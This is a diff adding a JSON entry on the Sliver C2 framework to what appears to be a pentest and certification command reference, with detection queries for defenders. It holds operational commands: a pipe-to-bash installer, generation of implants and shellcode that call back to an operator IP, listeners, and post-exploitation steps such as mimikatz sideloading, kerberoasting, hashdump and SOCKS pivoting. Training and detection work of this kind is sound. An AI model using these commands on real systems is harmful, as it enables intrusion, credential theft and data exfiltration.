@@ -1,0 +1,94 @@
+{
+  "id": "ad-sliver-c2",
+  "name": "Sliver - Modern C2 Framework",
+  "command": "sliver > generate --mtls <ip> --os windows --arch amd64 --save implant.exe",
+  "description": "Sliver is an open-source, cross-platform C2 framework by BishopFox. It supports HTTP(S), mTLS, DNS, and WireGuard transports with anti-forensic features. Generates implants for Windows/Linux/macOS. Designed as a modern alternative to Cobalt Strike with built-in evasion capabilities.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Post-Exploitation",
+  "subcategory": "Command & Control",
+  "certifications": [
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "BishopFox/sliver",
+  "tags": [
+    "sliver",
+    "c2",
+    "implant",
+    "beacon",
+    "mtls",
+    "command-and-control",
+    "post-exploitation"
+  ],
+  "mitre": [
+    "T1071.001",
+    "T1573.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INSTALL ===\n  curl https://sliver.sh/install | sudo bash\n  # Or from releases: https://github.com/BishopFox/sliver/releases\n\n=== START SERVER ===\n  sliver-server\n  # Starts interactive console\n\n=== GENERATE IMPLANTS ===\n  # Session (interactive):\n  generate --mtls <ip>:443 --os windows --arch amd64 --save implant.exe\n  # Beacon (async, stealthier):\n  generate beacon --mtls <ip>:443 --os windows --arch amd64 --save beacon.exe --seconds 30\n  # Shellcode:\n  generate --mtls <ip>:443 --os windows --format shellcode --save payload.bin\n  # Linux:\n  generate --mtls <ip>:443 --os linux --save implant\n\n=== START LISTENERS ===\n  mtls --lhost 0.0.0.0 --lport 443\n  https --lhost 0.0.0.0 --lport 8443\n  dns --domains c2.example.com\n  wg --lhost 0.0.0.0 --lport 51820\n\n=== POST-EXPLOITATION ===\n  use <session_id>\n  execute-assembly /path/to/Rubeus.exe kerberoast\n  sideload /path/to/mimikatz.dll\n  getsystem                  # Attempt privesc\n  hashdump                   # Dump SAM\n  screenshot                 # Take screenshot\n  upload /local/path /remote/path\n  download /remote/path\n  portfwd add -b 127.0.0.1:8080 -r <target>:80\n  socks5 start\n\n=== COMPARISON ===\n  Sliver:        Free, open-source, modern. Good evasion.\n  Havoc:         Free, newer. Demon-based implants.\n  Cobalt Strike: Commercial, most mature. Widely detected.\n  Metasploit:    Free, framework. Less evasion.",
+  "examples": [
+    {
+      "label": "Start mTLS listener",
+      "command": "mtls --lhost 0.0.0.0 --lport 443"
+    },
+    {
+      "label": "Generate Windows beacon",
+      "command": "generate beacon --mtls 10.10.14.5:443 --os windows --arch amd64 --save beacon.exe --seconds 30"
+    },
+    {
+      "label": "Execute .NET assembly in memory",
+      "command": "execute-assembly /opt/Rubeus.exe kerberoast"
+    }
+  ],
+  "references": [
+    {
+      "title": "Sliver C2",
+      "url": "https://github.com/BishopFox/sliver"
+    },
+    {
+      "title": "Sliver Documentation",
+      "url": "https://sliver.sh/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-havoc-c2",
+      "note": "Havoc C2 alternative with Demon-based implants.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Sliver generates unique implants per-operation with encrypted C2 channels. Supports multiple transport protocols and anti-analysis techniques to evade detection.",
+    "prerequisites": "Sliver server running; implant delivered to target; network egress for C2 channel.",
+    "impact": "Full remote control of compromised hosts; lateral movement; credential access; data exfiltration.",
+    "detection": "[MITRE T1071.001] Encrypted C2 traffic patterns; unusual process behavior; in-memory .NET assembly loading.",
+    "artifacts": "Implant binary on disk; persistent C2 connections; process hollowing/injection; unusual DNS or HTTP patterns.",
+    "splunk_spl": "index=proxy (dest_port=443 OR dest_port=8443)\n| stats count, avg(bytes_out) as avg_out, stdev(bytes_out) as std_out by src_ip, dest_ip\n| where std_out < 100 AND count > 100",
+    "elastic_kql": "tls.client.ja3:* AND destination.port:(443 OR 8443) AND NOT destination.domain:*",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort in (443, 8443)\n| summarize Beacons=count(), AvgBytes=avg(SentBytes) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)\n| where Beacons > 50",
+    "sigma_rules": "net_connection_sliver_c2_beacon",
+    "prevention": "EDR with behavioral detection; network monitoring for C2 patterns; TLS inspection; block unknown binaries.",
+    "sources": [
+      "BishopFox Sliver",
+      "https://attack.mitre.org/techniques/T1071/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "C2 beacon pattern - regular interval callbacks",
+        "logic": "DeviceNetworkEvents\n| where RemotePort in (443, 8443, 80, 53)\n| summarize Connections=count(), Sources=dcount(RemoteIP) by InitiatingProcessFileName, bin(Timestamp, 30m)\n| where Connections > 20 and Sources == 1\n| where InitiatingProcessFileName !in~ (\"chrome.exe\", \"firefox.exe\", \"msedge.exe\", \"teams.exe\")",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1071.001",
+          "T1573.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate software with heartbeat connections; update checkers",
+        "tuning": "Focus on non-browser processes with regular callback intervals; JA3 fingerprinting for known C2 signatures"
+      }
+    ]
+  }
+}
